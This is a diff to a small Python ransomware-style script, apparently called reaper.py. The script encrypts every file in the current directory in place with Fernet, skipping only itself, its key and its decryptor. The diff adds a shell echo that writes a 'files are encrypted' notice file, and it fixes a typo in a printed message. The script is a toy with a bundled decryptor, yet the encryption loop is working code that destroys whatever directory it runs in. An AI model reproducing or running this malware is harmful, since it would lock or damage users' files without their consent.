@@ -7,7 +7,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir():
-	if file=="reaper.py" or file == "key.key" or file=="reaperdecryptor.py":
+	if file=="reaper.py" or file == "key.key" or file=="reaperdecryptor.py" or file =="FILESENCRYPTED.txt":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
@@ -25,8 +25,8 @@ for file in files:
 		thefile.write(contents_encrypted)
 
 print (" All your files are encrypted! Luckily we have a decoder! ;)")
-print (" Find and run reaperdecryptor.py in the comman terminal to get your files back!")
+print (" Find and run reaperdecryptor.py in the command terminal to get your files back!")
 
 
-#with open ("README.txt","wb") as readme:
-	#readme.write("ATTENTION! All of your files have been locked and you need our special decryptor to make that happen. Luckily, it can be found on the desktop! You may delete this file")
+notice = ("echo 'Your files are encrypted! Run our magical decryptor to get them back!' > FILESENCRYPTED.txt")
+os.system(notice)
